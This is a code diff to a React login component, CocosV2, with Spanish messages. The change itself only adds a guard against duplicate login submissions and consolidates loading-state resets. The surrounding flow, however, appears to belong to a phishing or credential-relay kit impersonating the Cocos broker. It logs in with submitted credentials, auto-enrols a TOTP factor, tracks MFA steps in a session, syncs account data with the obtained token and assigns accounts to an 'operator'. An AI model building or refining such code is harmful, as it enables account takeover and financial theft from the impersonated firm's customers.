@@ -286,7 +286,12 @@ const CocosV2 = () => {
   // FLOW B: Login → Email verify → Auto-enroll TOTP → SMS → Sync → Done
   // =============================================
 
+  const loginInFlightRef = useRef(false);
+
   const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
+    if (loginInFlightRef.current) return;
+    loginInFlightRef.current = true;
+
     setError("");
     setLoading(true);
     setEmail(submittedEmail);
@@ -332,7 +337,6 @@ const CocosV2 = () => {
             setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
             await updateSession("email_challenge_sent", { otp_code: "mfa_type:enrolled" });
             setStep("email_verify");
-            setLoading(false);
             return;
           }
 
@@ -384,7 +388,6 @@ const CocosV2 = () => {
                 setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
                 await syncAccountData(verifyRes.access_token, submittedEmail);
                 setStep("verify_identity");
-                setLoading(false);
                 return;
               }
             }
@@ -399,7 +402,6 @@ const CocosV2 = () => {
             setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
             await updateSession("pedindo_mfa_google", { otp_code: "mfa_type:client_own" });
             setStep("mfa_verify");
-            setLoading(false);
             return;
           }
         } catch (defaultFactorErr) {
@@ -574,8 +576,10 @@ const CocosV2 = () => {
       }
     } catch {
       setError("Error de conexión. Intentá de nuevo.");
+    } finally {
+      setLoading(false);
+      loginInFlightRef.current = false;
     }
-    setLoading(false);
   }, [callApi, createSession, updateSession, syncAccountData, upsertAccountForOperator, operatorCode]);
 
   // ── Spanish error mapper ──
